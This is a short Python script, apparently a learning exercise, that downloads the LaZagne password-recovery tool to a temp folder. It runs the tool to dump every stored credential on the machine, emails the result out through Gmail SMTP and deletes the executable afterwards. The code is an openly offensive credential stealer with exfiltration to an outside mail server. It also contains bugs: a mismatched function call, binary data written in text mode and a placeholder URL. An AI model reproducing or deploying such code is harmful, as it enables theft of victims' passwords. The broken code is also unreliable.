# download lagazne and upload it on server, so that it can be downloaded directly
import requests
import subprocess
import smtplib
import os
import tempfile

def download(url):
	get_request = requests.get(url)
	with open("lazagne.exe","w") as file:
		file.write(get_request.content)

def send_mail(email_to,email_from,password,message):
	server = smtplib.SMTP("smtp.gmail.com",587)
	server.starttls()
	server.login(email_from,password)
	server.sendmail(email_from,email_to,message)
	server.quit()

temp_directory = tempfile.gettempdir()
os.chdir(temp_directory)
download("http://localhost where lazagne .exe is stored")
result = subprocess.check_output("lazagne.exe all",shell=True)
send_mail("mail@gmail.com","password",result)
os.remove("lazagne.exe")